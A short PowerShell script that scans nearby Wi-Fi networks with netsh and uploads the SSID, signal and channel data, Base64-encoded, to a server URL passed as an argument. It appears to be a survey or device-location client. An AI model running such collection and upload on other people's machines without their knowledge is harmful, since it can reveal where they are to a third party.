# Accept a command-line argument for the URI
param (
    [string]$uri = ""
)

# Poll for wireless network information with Netsh
$wifi = netsh wlan show networks mode=bssid | findstr "SSID Signal Channel"

# Fix data before Base64-encoding to preserve line breaks.
# The server-side parser breaks without this.
echo $wifi > wifidat.txt                                # Write netsh results to temporary file
$wifi = Get-Content wifidat.txt -Encoding UTF8 -Raw     # Update wifi variable with Raw switch
rm wifidat.txt                                          # Remove temporary file

# Set encoding of wifi data
$wifibytes = [System.Text.Encoding]::UTF8.GetBytes($wifi)

# Base64-encode the wifi data bytes
$wifienc = [Convert]::ToBase64String($wifibytes)

# Assemble post data
$postdat = @{os='windows';data=$wifienc}

# Send POST request to server, using CMD as agent
Invoke-WebRequest -Uri "$uri/CMD" -Method POST -Body $postdat
